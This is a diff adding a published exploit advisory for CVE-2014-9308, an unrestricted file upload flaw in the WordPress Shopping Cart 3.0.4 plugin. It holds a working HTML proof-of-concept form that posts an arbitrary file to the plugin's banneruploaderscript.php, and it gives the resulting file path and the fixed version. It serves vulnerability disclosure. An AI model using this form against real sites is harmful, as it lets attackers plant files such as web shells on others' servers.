@@ -1,0 +1,38 @@
+<!--
+# Exploit Title: WordPress Shopping Cart 3.0.4 Unrestricted File Upload
+# Date: 29-10-2014
+# Software Link: https://wordpress.org/plugins/wp-easycart/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# CVE: CVE-2014-9308
+# Category: webapps
+
+1. Description
+  
+Any registered user can upload any file because of incorrect if statement inside banneruploaderscript.php
+
+http://security.szurek.pl/wordpress-shopping-cart-304-unrestricted-file-upload.html
+
+  
+2. Proof of Concept
+
+Login as regular user (created using wp-login.php?action=register):
+-->
+
+<form action="http://wordpress-install/wp-content/plugins/wp-easycart/inc/amfphp/administration/banneruploaderscript.php" method="post" enctype="multipart/form-data">
+    <input type="hidden" name="datemd5" value="1">
+    <input type="file" name="Filedata">
+    <input value="Upload!" type="submit">
+</form>
+
+<!--
+File will be visible:
+
+http://wordpress-install/wp-content/plugins/wp-easycart/products/banners/%filename%_1.%fileextension%
+  
+3. Solution:
+  
+Update to version 3.0.9
+https://downloads.wordpress.org/plugin/wp-easycart.3.0.9.zip
+-->
